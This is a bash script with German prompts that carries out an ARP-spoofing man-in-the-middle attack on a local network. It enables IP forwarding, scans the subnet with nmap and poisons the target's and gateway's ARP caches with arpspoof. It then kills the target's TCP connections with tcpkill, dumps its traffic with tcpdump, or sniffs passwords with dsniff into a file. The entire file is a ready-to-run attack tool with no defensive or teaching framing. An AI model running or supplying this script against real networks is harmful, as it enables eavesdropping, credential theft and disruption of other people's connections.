#!/bin/bash

set -ex

if [[ $EUID -ne 0 ]]; then
    echo "This script must be run as root" 1>&2
    sudo $0
    exit 0
fi

echo 1 > /proc/sys/net/ipv4/ip_forward

gateway=$(ip route show | grep dev -m1 | cut -d" " -f 3 )

if [ -z "$1" ]; then
  ip link
  read -p "Wie heisst die Schnittstelle? [enp4s0\eth0] : " modul
else
  modul="$1"
fi
if [ -z "$2" ]; then
  nmap -v -sn ${gateway}/24
  read -p "Wie heisst die IP? : " ip
else
  ip="$2"
fi

arpspoof -i $modul -t $ip -r $gateway &

sleep 2

if [ -z "$3" ] || [ "$3" == "tcpkill" ]; then
  tcpkill -9 host $ip
elif [ "$3" == "tcpdump" ]; then
  tcpdump -i $modul -A host $ip > out.txt
else
  dsniff -i $modul -mc > out.txt
fi
